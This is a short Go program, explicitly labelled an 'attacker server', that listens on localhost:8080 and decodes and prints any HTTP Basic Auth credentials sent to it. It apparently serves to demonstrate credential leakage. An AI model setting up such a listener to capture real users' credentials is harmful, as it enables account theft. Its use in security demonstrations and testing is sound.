package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"strings"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("\n--- NEW REQUEST RECEIVED ---")

		// Get the Authorization header
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			fmt.Println("No Authorization header found.")
			w.Write([]byte("OK"))
			return
		}

		fmt.Printf("Authorization Header: %s\n", authHeader)

		// --- "EVIL" LOGIC ---
		// Check if it's Basic Auth
		if strings.HasPrefix(authHeader, "Basic ") {
			// Get the Base64 part
			encodedCreds := strings.TrimPrefix(authHeader, "Basic ")

			// Decode the Base64 string
			decodedBytes, err := base64.StdEncoding.DecodeString(encodedCreds)
			if err != nil {
				fmt.Println("Error decoding Base64:", err)
			} else {
				// Print the decoded credentials
				fmt.Printf("\n!!! 😱 BASIC AUTH INTERCEPTED !!!\n")
				fmt.Printf("!!! DECODED: %s\n\n", string(decodedBytes))
			}
		}
		// --- END EVIL LOGIC ---

		w.Write([]byte("OK"))
	})

	fmt.Println("attacker server listening on http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
